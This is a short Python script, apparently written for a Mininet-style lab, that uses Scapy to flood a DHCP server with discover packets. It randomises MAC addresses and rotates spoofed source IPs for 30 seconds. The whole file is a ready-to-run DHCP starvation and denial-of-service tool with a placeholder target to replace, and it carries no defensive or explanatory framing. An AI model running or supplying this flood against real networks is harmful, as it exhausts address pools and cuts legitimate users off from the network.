from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, UDP
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.sendrecv import sendp
from scapy.all import RandMAC
import time

def send_dhcp_flood(target_ip, iface):
    try:
        start_time = time.time()
        print(f"[+] Starting DHCP flooding for 30 seconds targeting {target_ip}")
        ip_counter = 1  # Counter for incrementing IPs

        while time.time() - start_time < 30:
            # Incrementing source IPs within a private range
            src_ip = f"192.168.100.{ip_counter % 255}"
            dhcp_discover = (
                Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") /
                IP(src=src_ip, dst=target_ip) /
                UDP(sport=68, dport=67) /
                BOOTP(chaddr=RandMAC()) /
                DHCP(options=[("message-type", "discover"), "end"])
            )
            sendp(dhcp_discover, iface=iface, verbose=False)
            ip_counter += 1  # Increment the counter
        print("[+] DHCP flood complete.")
    except Exception as e:
        print(f"An error occurred during DHCP flooding: {e}")

# Define the target IP address (the DHCP server's IP) and the network interface
target_ip = "192.168.227.1"  # Replace with your DHCP server's IP
iface = "h1-eth0"  # Replace with the appropriate network interface

# Execute the DHCP flood
send_dhcp_flood(target_ip, iface)
